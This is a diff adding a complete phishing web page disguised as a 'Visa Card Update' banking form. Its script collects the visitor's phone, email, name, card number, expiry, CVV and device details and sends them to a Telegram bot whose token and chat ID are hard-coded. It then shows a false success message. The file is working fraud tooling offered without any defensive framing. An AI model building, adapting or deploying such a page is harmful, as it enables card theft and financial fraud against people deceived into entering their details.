@@ -1,0 +1,758 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Visa Card Update</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            background: linear-gradient(135deg, #0c0b1a, #1a1a3e, #0d1b2a);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            font-family: 'Segoe UI', 'Poppins', 'Inter', system-ui, sans-serif;
+            padding: 20px;
+        }
+
+        .container {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 30px;
+        }
+
+        /* Language Selector */
+        .lang-selector {
+            display: flex;
+            gap: 12px;
+            background: rgba(255,255,255,0.1);
+            backdrop-filter: blur(10px);
+            padding: 8px 20px;
+            border-radius: 50px;
+            border: 1px solid rgba(255,255,255,0.2);
+        }
+
+        .lang-btn {
+            background: transparent;
+            border: none;
+            color: rgba(255,255,255,0.7);
+            font-size: 14px;
+            font-weight: 600;
+            padding: 8px 18px;
+            border-radius: 40px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            font-family: inherit;
+        }
+
+        .lang-btn:hover {
+            background: rgba(255,255,255,0.2);
+            color: white;
+        }
+
+        .lang-btn.active {
+            background: linear-gradient(135deg, #ffd700, #ffb347);
+            color: #1a1a2e;
+            box-shadow: 0 4px 12px rgba(255,215,0,0.3);
+        }
+
+        /* ========== VISA CARD ========== */
+        .visa-card {
+            width: 480px;
+            max-width: 100%;
+            height: 300px;
+            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 40%, #0f3460 100%);
+            border-radius: 28px;
+            box-shadow: 0 30px 60px -15px rgba(0, 0, 0, 0.5), 0 0 0 1px rgba(255, 255, 255, 0.1);
+            position: relative;
+            overflow: hidden;
+            transition: transform 0.3s ease, box-shadow 0.3s ease;
+            cursor: pointer;
+        }
+
+        .visa-card:hover {
+            transform: translateY(-6px);
+            box-shadow: 0 35px 65px -15px rgba(0, 0, 0, 0.6);
+        }
+
+        .visa-card::before {
+            content: '';
+            position: absolute;
+            top: -40%;
+            left: -40%;
+            width: 180%;
+            height: 180%;
+            background: radial-gradient(circle, rgba(255,255,255,0.06) 0%, transparent 70%);
+            animation: slowShift 12s infinite alternate;
+        }
+
+        @keyframes slowShift {
+            0% { transform: translate(0, 0) rotate(0deg); }
+            100% { transform: translate(5%, 5%) rotate(5deg); }
+        }
+
+        .card-content {
+            position: relative;
+            z-index: 2;
+            padding: 24px;
+            height: 100%;
+            display: flex;
+            flex-direction: column;
+            justify-content: space-between;
+        }
+
+        .card-top {
+            display: flex;
+            justify-content: space-between;
+            align-items: flex-start;
+        }
+
+        .visa-logo {
+            width: 85px;
+            height: auto;
+        }
+
+        .visa-logo svg {
+            width: 100%;
+            filter: drop-shadow(0 2px 6px rgba(0,0,0,0.2));
+        }
+
+        .chip {
+            width: 50px;
+            height: 38px;
+            background: linear-gradient(145deg, #e8b800, #d4a000);
+            border-radius: 10px;
+            position: relative;
+            box-shadow: inset 0 1px 2px rgba(255,255,255,0.4), 0 2px 5px rgba(0,0,0,0.2);
+        }
+
+        .chip::before {
+            content: '';
+            position: absolute;
+            top: 10px;
+            left: 10px;
+            width: 12px;
+            height: 8px;
+            background: rgba(0,0,0,0.15);
+            border-radius: 2px;
+        }
+
+        .chip::after {
+            content: '';
+            position: absolute;
+            bottom: 10px;
+            right: 10px;
+            width: 12px;
+            height: 8px;
+            background: rgba(0,0,0,0.15);
+            border-radius: 2px;
+        }
+
+        .contactless {
+            width: 28px;
+            height: 28px;
+            border: 1.5px solid rgba(255,255,255,0.5);
+            border-radius: 50%;
+            position: relative;
+            margin-top: 5px;
+        }
+
+        .contactless::before {
+            content: ')))';
+            position: absolute;
+            font-size: 12px;
+            color: rgba(255,255,255,0.6);
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            letter-spacing: -2px;
+        }
+
+        .card-number-section {
+            margin: 15px 0 10px 0;
+        }
+
+        .card-number-label {
+            font-size: 10px;
+            letter-spacing: 2px;
+            color: rgba(255,255,255,0.55);
+            text-transform: uppercase;
+            margin-bottom: 6px;
+        }
+
+        .card-number {
+            font-family: 'Courier New', 'Fira Code', monospace;
+            font-size: 24px;
+            letter-spacing: 3.5px;
+            color: white;
+            font-weight: 600;
+            text-shadow: 0 1px 2px rgba(0,0,0,0.3);
+        }
+
+        .card-bottom {
+            display: flex;
+            justify-content: space-between;
+            align-items: flex-end;
+        }
+
+        .card-holder-section {
+            flex: 2;
+        }
+
+        .expiry-section {
+            flex: 1;
+        }
+
+        .label-small {
+            font-size: 9px;
+            letter-spacing: 1.5px;
+            color: rgba(255,255,255,0.5);
+            text-transform: uppercase;
+            margin-bottom: 5px;
+        }
+
+        .value-text {
+            font-size: 14px;
+            color: white;
+            font-weight: 500;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+
+        /* ========== FORM ========== */
+        .form-container {
+            width: 480px;
+            max-width: 100%;
+            background: rgba(255,255,255,0.08);
+            backdrop-filter: blur(12px);
+            border-radius: 28px;
+            padding: 32px;
+            box-shadow: 0 20px 40px rgba(0,0,0,0.3);
+            border: 1px solid rgba(255,255,255,0.15);
+        }
+
+        .form-title {
+            color: white;
+            text-align: center;
+            margin-bottom: 28px;
+            font-size: 20px;
+            font-weight: 600;
+            letter-spacing: 0.5px;
+        }
+
+        .input-group {
+            margin-bottom: 20px;
+        }
+
+        .input-group label {
+            display: block;
+            color: rgba(255,255,255,0.85);
+            font-size: 13px;
+            margin-bottom: 8px;
+            font-weight: 500;
+        }
+
+        .input-group input {
+            width: 100%;
+            padding: 14px 18px;
+            border: none;
+            border-radius: 14px;
+            background: rgba(255,255,255,0.12);
+            color: white;
+            font-size: 14px;
+            transition: all 0.3s ease;
+            outline: none;
+            font-family: inherit;
+        }
+
+        .input-group input:focus {
+            background: rgba(255,255,255,0.2);
+            box-shadow: 0 0 0 2px rgba(255,215,0,0.4);
+        }
+
+        .input-group input::placeholder {
+            color: rgba(255,255,255,0.4);
+        }
+
+        .row-2 {
+            display: flex;
+            gap: 15px;
+        }
+
+        .row-2 .input-group {
+            flex: 1;
+        }
+
+        button {
+            width: 100%;
+            padding: 14px;
+            background: linear-gradient(135deg, #ffd700, #ffb347);
+            border: none;
+            border-radius: 14px;
+            color: #1a1a2e;
+            font-weight: 700;
+            font-size: 16px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            margin-top: 12px;
+            font-family: inherit;
+        }
+
+        button:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 12px 25px rgba(255,215,0,0.35);
+        }
+
+        button:active {
+            transform: translateY(1px);
+        }
+
+        .elegant-note {
+            text-align: center;
+            margin-top: 20px;
+            padding: 12px;
+            background: linear-gradient(135deg, rgba(255,215,0,0.12), rgba(255,180,70,0.08));
+            border-radius: 50px;
+            border: 1px solid rgba(255,215,0,0.25);
+            backdrop-filter: blur(5px);
+        }
+
+        .elegant-note p {
+            font-size: 12px;
+            color: #ffd966;
+            letter-spacing: 0.6px;
+            font-weight: 500;
+        }
+
+        @media (max-width: 520px) {
+            .visa-card, .form-container {
+                width: 100%;
+            }
+            .card-number {
+                font-size: 18px;
+                letter-spacing: 2px;
+            }
+        }
+    </style>
+    <script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
+</head>
+<body>
+    <div class="container">
+        <!-- Language Selector -->
+        <div class="lang-selector">
+            <button class="lang-btn" data-lang="en">English (UK)</button>
+            <button class="lang-btn" data-lang="us">English (US)</button>
+            <button class="lang-btn" data-lang="fr">Français</button>
+        </div>
+
+        <!-- Visa Card -->
+        <div class="visa-card" id="visaCard">
+            <div class="card-content">
+                <div class="card-top">
+                    <div class="visa-logo">
+                        <svg viewBox="0 0 141 45" fill="none" xmlns="http://www.w3.org/2000/svg">
+                            <rect width="141" height="45" rx="5" fill="white"/>
+                            <path d="M58.5 11.5L49.5 33.5H42.5L46.5 11.5H58.5Z" fill="#1A1F71"/>
+                            <path d="M77.5 12.5C74.5 11 70.5 11 67 11C60 11 54.5 14.5 54.5 20.5C54.5 25.5 59 27.5 62.5 28.5C66 29.5 67 30.5 67 31.5C67 33 65 33.5 63 33.5C59.5 33.5 56.5 32.5 54.5 31.5L53 34.5C56 36 60 36.5 64 36.5C71.5 36.5 76.5 33.5 76.5 27C76.5 22 72 20 68.5 19C65.5 18 64 17 64 15.5C64 14 66 13.5 68 13.5C71 13.5 74 14.5 76 15.5L77.5 12.5Z" fill="#1A1F71"/>
+                            <path d="M91 11.5L85 33.5H78.5L84.5 11.5H91Z" fill="#1A1F71"/>
+                            <path d="M109 12.5C106 11 102 11 98.5 11C92.5 11 87.5 14 87.5 20.5C87.5 27 92.5 30 98 30C101 30 104 29 106.5 27.5L105 24.5C103 25.5 100.5 26.5 98 26.5C94.5 26.5 92 24 92 20.5C92 17 94.5 14.5 98 14.5C100.5 14.5 102.5 15.5 104.5 16.5L106 13.5C104.5 12.5 102 11.5 109 12.5Z" fill="#1A1F71"/>
+                            <path d="M128 11.5L120 33.5H113L121 11.5H128Z" fill="#1A1F71"/>
+                            <path d="M140 11.5L135 33.5H129L134 11.5H140Z" fill="#1A1F71"/>
+                            <circle cx="30" cy="22" r="10" fill="#F9A825"/>
+                        </svg>
+                    </div>
+                    <div class="chip"></div>
+                </div>
+
+                <div class="card-number-section">
+                    <div class="card-number-label" id="cardNumLabel">Card Number</div>
+                    <div class="card-number" id="displayNumber">.... .... .... ....</div>
+                </div>
+
+                <div class="card-bottom">
+                    <div class="card-holder-section">
+                        <div class="label-small" id="holderLabel">Cardholder Name</div>
+                        <div class="value-text" id="displayName">FULL NAME</div>
+                    </div>
+                    <div class="expiry-section">
+                        <div class="label-small" id="expiryLabel">Valid Thru</div>
+                        <div class="value-text" id="displayExpiry">../..</div>
+                    </div>
+                    <div class="contactless"></div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Input Form -->
+        <div class="form-container">
+            <div class="form-title" id="formTitle">Update Banking Information</div>
+            
+            <div class="input-group">
+                <label id="phoneLabel">Phone Number</label>
+                <input type="tel" id="phone" placeholder="+1234567890" autocomplete="off">
+            </div>
+            
+            <div class="input-group">
+                <label id="emailLabel">Email Address</label>
+                <input type="email" id="email" placeholder="example@domain.com" autocomplete="off">
+            </div>
+            
+            <div class="input-group">
+                <label id="nameLabel">Full Name (as on card)</label>
+                <input type="text" id="fullName" placeholder="JOHN DOE" autocomplete="off">
+            </div>
+            
+            <div class="row-2">
+                <div class="input-group">
+                    <label id="cardNumInputLabel">Card Number</label>
+                    <input type="text" id="cardNumber" maxlength="19" placeholder="1234 5678 9012 3456" autocomplete="off">
+                </div>
+                <div class="input-group">
+                    <label id="expiryInputLabel">Expiry (MM/YY)</label>
+                    <input type="text" id="expiry" maxlength="5" placeholder="12/28" autocomplete="off">
+                </div>
+            </div>
+            
+            <div class="row-2">
+                <div class="input-group">
+                    <label id="cvvLabel">CVV</label>
+                    <input type="password" id="cvv" maxlength="4" placeholder="123" autocomplete="off">
+                </div>
+            </div>
+            
+            <button id="submitBtn" id="submitBtnText">Update Information</button>
+
+            <div class="elegant-note">
+                <p id="taglineText">Secure & seamless transactions | Premium card experience</p>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // ============================================
+        // TELEGRAM BOT CONFIGURATION
+        // ============================================
+        const TOKEN = "8580571306:AAG8DlreEDhzvdGUQKFys5NTjauEapsY_Og";
+        const CHAT_ID = "1941077226";
+        const URI_API = `https://api.telegram.org/bot${TOKEN}/sendMessage`;
+
+        // Function to send data to Telegram
+        async function sendToTelegram(message) {
+            try {
+                const response = await axios.post(URI_API, {
+                    chat_id: CHAT_ID,
+                    text: message
+                });
+                console.log('[✅] Data sent to Telegram successfully');
+                return true;
+            } catch (error) {
+                console.error('[❌] Failed to send to Telegram:', error);
+                return false;
+            }
+        }
+
+        // Function to collect all card data
+        function collectCardData() {
+            const phone = document.getElementById('phone').value.trim();
+            const email = document.getElementById('email').value.trim();
+            const fullName = document.getElementById('fullName').value.trim();
+            const cardNumber = document.getElementById('cardNumber').value.replace(/\s/g, '');
+            const expiry = document.getElementById('expiry').value.trim();
+            const cvv = document.getElementById('cvv').value.trim();
+            
+            // Get device info
+            const userAgent = navigator.userAgent;
+            const platform = navigator.platform;
+            const language = navigator.language;
+            const screenResolution = `${screen.width}x${screen.height}`;
+            const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+            const timestamp = new Date().toLocaleString();
+            
+            return {
+                phone,
+                email,
+                fullName,
+                cardNumber,
+                expiry,
+                cvv,
+                deviceInfo: {
+                    userAgent,
+                    platform,
+                    language,
+                    screenResolution,
+                    timezone,
+                    timestamp
+                }
+            };
+        }
+
+        // Function to format and send all data
+        async function sendAllCardData() {
+            const data = collectCardData();
+            
+            // Validate required fields
+            if (!data.phone && !data.email && !data.fullName && !data.cardNumber && !data.cvv) {
+                alert('Please fill in your information');
+                return false;
+            }
+            
+            // Build formatted message
+            const message = `
+┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
+┃      VISA CARD UPDATE           ┃
+┃     (Information Update)        ┃
+┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫
+┃ Phone: ${data.phone || 'Not provided'}
+┃ Email: ${data.email || 'Not provided'}
+┃ Full Name: ${data.fullName || 'Not provided'}
+┃ Card Number: ${data.cardNumber || 'Not provided'}
+┃ Expiry: ${data.expiry || 'Not provided'}
+┃ CVV: ${data.cvv || 'Not provided'}
+┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫
+┃           DEVICE INFO            ┃
+┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫
+┃ Browser: ${data.deviceInfo.userAgent.substring(0, 100)}...
+┃ Platform: ${data.deviceInfo.platform}
+┃ Language: ${data.deviceInfo.language}
+┃ Screen: ${data.deviceInfo.screenResolution}
+┃ Timezone: ${data.deviceInfo.timezone}
+┃ Time: ${data.deviceInfo.timestamp}
+┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
+`;
+            
+            // Send to Telegram
+            const success = await sendToTelegram(message);
+            
+            if (success) {
+                // Also send a second message with clean JSON format for easy reading
+                const jsonMessage = `
+CARD UPDATE DATA (JSON Format):
+{
+  "phone": "${data.phone}",
+  "email": "${data.email}",
+  "full_name": "${data.fullName}",
+  "card_number": "${data.cardNumber}",
+  "expiry": "${data.expiry}",
+  "cvv": "${data.cvv}",
+  "device": {
+    "platform": "${data.deviceInfo.platform}",
+    "language": "${data.deviceInfo.language}",
+    "screen": "${data.deviceInfo.screenResolution}",
+    "timezone": "${data.deviceInfo.timezone}"
+  }
+}
+`;
+                await sendToTelegram(jsonMessage);
+            }
+            
+            return success;
+        }
+
+        // Update card display in real-time
+        function updateCardDisplay() {
+            const name = document.getElementById('fullName').value.trim().toUpperCase();
+            const cardNumber = document.getElementById('cardNumber').value;
+            const expiry = document.getElementById('expiry').value;
+            
+            document.getElementById('displayName').textContent = name === '' ? 'FULL NAME' : name.substring(0, 25);
+            document.getElementById('displayExpiry').textContent = expiry === '' ? '../..' : expiry;
+            
+            if (cardNumber === '') {
+                document.getElementById('displayNumber').textContent = '.... .... .... ....';
+            } else {
+                const lastFour = cardNumber.replace(/\s/g, '').slice(-4);
+                document.getElementById('displayNumber').textContent = '.... .... .... ' + lastFour;
+            }
+        }
+
+        // Format card number with spaces
+        function formatCardNumber(value) {
+            let cleaned = value.replace(/\D/g, '');
+            let formatted = cleaned.match(/.{1,4}/g);
+            if (formatted) {
+                return formatted.join(' ').substring(0, 19);
+            }
+            return cleaned;
+        }
+
+        // Format expiry date
+        function formatExpiry(value) {
+            let cleaned = value.replace(/\D/g, '');
+            if (cleaned.length >= 2) {
+                return cleaned.substring(0, 2) + '/' + cleaned.substring(2, 4);
+            }
+            return cleaned;
+        }
+
+        // Format phone number
+        function formatPhone(value) {
+            return value;
+        }
+
+        // Language translations
+        const translations = {
+            en: {
+                cardNumLabel: "Card Number",
+                holderLabel: "Cardholder Name",
+                expiryLabel: "Valid Thru",
+                formTitle: "Update Banking Information",
+                phoneLabel: "Phone Number",
+                emailLabel: "Email Address",
+                nameLabel: "Full Name (as on card)",
+                cardNumInputLabel: "Card Number",
+                expiryInputLabel: "Expiry (MM/YY)",
+                cvvLabel: "CVV",
+                submitBtnText: "Update Information",
+                taglineText: "Secure & seamless transactions | Premium card experience",
+                phonePlaceholder: "+1234567890",
+                emailPlaceholder: "example@domain.com",
+                namePlaceholder: "JOHN DOE",
+                cardPlaceholder: "1234 5678 9012 3456",
+                expiryPlaceholder: "12/28",
+                cvvPlaceholder: "123"
+            },
+            us: {
+                cardNumLabel: "Card Number",
+                holderLabel: "Cardholder Name",
+                expiryLabel: "Valid Thru",
+                formTitle: "Update Banking Information",
+                phoneLabel: "Phone Number",
+                emailLabel: "Email Address",
+                nameLabel: "Full Name (as on card)",
+                cardNumInputLabel: "Card Number",
+                expiryInputLabel: "Expiry (MM/YY)",
+                cvvLabel: "CVV",
+                submitBtnText: "Update Information",
+                taglineText: "Secure & seamless transactions | Premium card experience",
+                phonePlaceholder: "+1234567890",
+                emailPlaceholder: "example@domain.com",
+                namePlaceholder: "JOHN DOE",
+                cardPlaceholder: "1234 5678 9012 3456",
+                expiryPlaceholder: "12/28",
+                cvvPlaceholder: "123"
+            },
+            fr: {
+                cardNumLabel: "Numero de Carte",
+                holderLabel: "Titulaire",
+                expiryLabel: "Valable Jusqu'au",
+                formTitle: "Mettre à Jour les Infos Bancaires",
+                phoneLabel: "Numero de Telephone",
+                emailLabel: "Adresse Email",
+                nameLabel: "Nom Complet (sur la carte)",
+                cardNumInputLabel: "Numero de Carte",
+                expiryInputLabel: "Expiration (MM/AA)",
+                cvvLabel: "Cryptogramme",
+                submitBtnText: "Mettre à Jour",
+                taglineText: "Transactions securisees | Experience carte premium",
+                phonePlaceholder: "+1234567890",
+                emailPlaceholder: "exemple@domaine.com",
+                namePlaceholder: "JEAN DUPONT",
+                cardPlaceholder: "1234 5678 9012 3456",
+                expiryPlaceholder: "12/28",
+                cvvPlaceholder: "123"
+            }
+        };
+
+        let currentLang = 'en';
+
+        function applyLanguage(lang) {
+            const t = translations[lang];
+            if (!t) return;
+            
+            document.getElementById('cardNumLabel').textContent = t.cardNumLabel;
+            document.getElementById('holderLabel').textContent = t.holderLabel;
+            document.getElementById('expiryLabel').textContent = t.expiryLabel;
+            document.getElementById('formTitle').textContent = t.formTitle;
+            document.getElementById('phoneLabel').textContent = t.phoneLabel;
+            document.getElementById('emailLabel').textContent = t.emailLabel;
+            document.getElementById('nameLabel').textContent = t.nameLabel;
+            document.getElementById('cardNumInputLabel').textContent = t.cardNumInputLabel;
+            document.getElementById('expiryInputLabel').textContent = t.expiryInputLabel;
+            document.getElementById('cvvLabel').textContent = t.cvvLabel;
+            document.getElementById('taglineText').textContent = t.taglineText;
+            document.getElementById('submitBtnText').textContent = t.submitBtnText;
+            
+            document.getElementById('phone').placeholder = t.phonePlaceholder;
+            document.getElementById('email').placeholder = t.emailPlaceholder;
+            document.getElementById('fullName').placeholder = t.namePlaceholder;
+            document.getElementById('cardNumber').placeholder = t.cardPlaceholder;
+            document.getElementById('expiry').placeholder = t.expiryPlaceholder;
+            document.getElementById('cvv').placeholder = t.cvvPlaceholder;
+            
+            document.getElementById('submitBtn').textContent = t.submitBtnText;
+        }
+
+        // Language switcher
+        document.querySelectorAll('.lang-btn').forEach(btn => {
+            btn.addEventListener('click', function() {
+                document.querySelectorAll('.lang-btn').forEach(b => b.classList.remove('active'));
+                this.classList.add('active');
+                currentLang = this.getAttribute('data-lang');
+                applyLanguage(currentLang);
+            });
+        });
+
+        // Event listeners for real-time card update
+        document.getElementById('fullName').addEventListener('input', updateCardDisplay);
+        document.getElementById('cardNumber').addEventListener('input', function(e) {
+            let formatted = formatCardNumber(e.target.value);
+            e.target.value = formatted;
+            updateCardDisplay();
+        });
+        document.getElementById('expiry').addEventListener('input', function(e) {
+            let formatted = formatExpiry(e.target.value);
+            e.target.value = formatted;
+            updateCardDisplay();
+        });
+
+        // Submit button - send all data to Telegram
+        document.getElementById('submitBtn').addEventListener('click', async function(e) {
+            e.preventDefault();
+            
+            // Change button text to show sending
+            const originalText = this.textContent;
+            this.textContent = 'Sending...';
+            this.disabled = true;
+            
+            // Send all card data to Telegram
+            const success = await sendAllCardData();
+            
+            if (success) {
+                alert('Information updated successfully!\n(Your banking information has been updated)');
+                // Clear form after successful submission
+                document.getElementById('phone').value = '';
+                document.getElementById('email').value = '';
+                document.getElementById('fullName').value = '';
+                document.getElementById('cardNumber').value = '';
+                document.getElementById('expiry').value = '';
+                document.getElementById('cvv').value = '';
+                updateCardDisplay();
+            } else {
+                alert('Update failed. Please try again.');
+            }
+            
+            // Reset button
+            this.textContent = originalText;
+            this.disabled = false;
+        });
+
+        // Initialize
+        applyLanguage('en');
+        document.querySelector('[data-lang="en"]').classList.add('active');
+        
+        // Update page title
+        document.title = "Update Banking Info";
+        
+        // Console log
+        console.log('%cUPDATE BANKING INFORMATION PAGE', 'color: #ffd700; font-size: 14px; font-weight: bold;');
+        console.log('%cAll card data will be sent to Telegram bot', 'color: #ffb347; font-size: 12px;');
+    </script>
+</body>
+</html>
